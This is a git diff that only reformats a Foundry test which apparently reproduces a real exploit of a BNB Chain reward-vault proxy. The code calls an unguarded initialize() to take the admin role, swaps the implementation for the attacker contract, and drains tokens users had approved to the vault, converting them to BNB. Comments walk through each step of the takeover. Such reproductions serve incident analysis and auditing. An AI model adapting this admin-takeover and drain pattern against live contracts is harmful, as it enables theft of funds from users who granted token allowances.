@@ -14,11 +14,7 @@ import "./interface.sol";
 // https://defimon.xyz/exploit/bsc/0x5366c6ba729d9cf8d472500afc1a2976ac2fe9ff
 
 interface IRewardVaultDelegator {
-    function initialize(
-        address bnftRegistry,
-        address vrfCoordinator,
-        uint64 subscriptionId
-    ) external;
+    function initialize(address bnftRegistry, address vrfCoordinator, uint64 subscriptionId) external;
 
     function setImplementation(address implementation) external;
 
@@ -30,26 +26,18 @@ interface IRewardVaultDelegator {
 contract ContractTest is Test {
     IRewardVaultDelegator private constant RewardVaultDelegator =
         IRewardVaultDelegator(0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887);
-    Uni_Router_V2 private constant Router =
-        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-    IERC20 private constant RACA =
-        IERC20(0x12BB890508c125661E03b09EC06E404bc9289040);
-    IERC20 private constant BUSDT =
-        IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
-    IERC20 private constant FLOKI =
-        IERC20(0xfb5B838b6cfEEdC2873aB27866079AC55363D37E);
-    IERC20 private constant OLE =
-        IERC20(0xa865197A84E780957422237B5D152772654341F3);
-    IERC20 private constant CSIX =
-        IERC20(0x04756126F044634C9a0f0E985e60c88a51ACC206);
-    IERC20 private constant BABY =
-        IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);
-    address private constant openLeverageDeployer =
-        0xE9547CF7E592F83C5141bB50648317e35D27D29B;
+    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IERC20 private constant RACA = IERC20(0x12BB890508c125661E03b09EC06E404bc9289040);
+    IERC20 private constant BUSDT = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
+    IERC20 private constant FLOKI = IERC20(0xfb5B838b6cfEEdC2873aB27866079AC55363D37E);
+    IERC20 private constant OLE = IERC20(0xa865197A84E780957422237B5D152772654341F3);
+    IERC20 private constant CSIX = IERC20(0x04756126F044634C9a0f0E985e60c88a51ACC206);
+    IERC20 private constant BABY = IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);
+    address private constant openLeverageDeployer = 0xE9547CF7E592F83C5141bB50648317e35D27D29B;
     address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
 
     function setUp() public {
-        vm.createSelectFork("bsc", 32820951);
+        vm.createSelectFork("bsc", 32_820_951);
         vm.label(address(RewardVaultDelegator), "RewardVaultDelegator");
         vm.label(address(Router), "Router");
         vm.label(address(RACA), "RACA");
@@ -64,30 +52,18 @@ contract ContractTest is Test {
 
     function testExploit() public {
         deal(address(this), 0 ether);
-        emit log_named_decimal_uint(
-            "Attacker BNB balance before exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Attacker BNB balance before exploit", address(this).balance, 18);
 
         assertEq(openLeverageDeployer, RewardVaultDelegator.admin());
-        emit log_named_address(
-            "Original admin address (Open Leverage Deployer)",
-            RewardVaultDelegator.admin()
-        );
+        emit log_named_address("Original admin address (Open Leverage Deployer)", RewardVaultDelegator.admin());
 
         // Valid initialize function should have implemented check which restrict function to be called only once
         // 'initialize()' sets admin variable in RewardVaultDelegator contract
-        RewardVaultDelegator.initialize(
-            address(this),
-            address(this),
-            uint64(1)
-        );
+        RewardVaultDelegator.initialize(address(this), address(this), uint64(1));
 
         assertEq(address(this), RewardVaultDelegator.admin());
         emit log_named_address(
-            "Admin address after calling initialize func (admin change)",
-            RewardVaultDelegator.admin()
+            "Admin address after calling initialize func (admin change)", RewardVaultDelegator.admin()
         );
 
         // setImplementation func have 'onlyAdmin' modifier and at this step attacker can bypass this check
@@ -96,26 +72,15 @@ contract ContractTest is Test {
         // Calling 'a' will make delegatecall to this contract (implementation contract)
         RewardVaultDelegator.a(address(this));
 
-        emit log_named_decimal_uint(
-            "Attacker BNB balance after exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Attacker BNB balance after exploit", address(this).balance, 18);
     }
 
-    function transferFromAndSwapTokensToBNB(
-        address from,
-        address token,
-        address to
-    ) internal {
+    function transferFromAndSwapTokensToBNB(address from, address token, address to) internal {
         IERC20(token).approve(address(Router), type(uint256).max);
 
         if (from != address(0)) {
             uint256 transferAmount = IERC20(token).balanceOf(from);
-            uint256 allowance = IERC20(token).allowance(
-                from,
-                address(RewardVaultDelegator)
-            );
+            uint256 allowance = IERC20(token).allowance(from, address(RewardVaultDelegator));
             if (allowance < transferAmount) {
                 transferAmount = allowance;
             }
@@ -127,11 +92,7 @@ contract ContractTest is Test {
         path[0] = token;
         path[1] = WBNB;
         Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-            IERC20(token).balanceOf(address(this)),
-            0,
-            path,
-            to,
-            block.timestamp + 1000
+            IERC20(token).balanceOf(address(this)), 0, path, to, block.timestamp + 1000
         );
     }
 
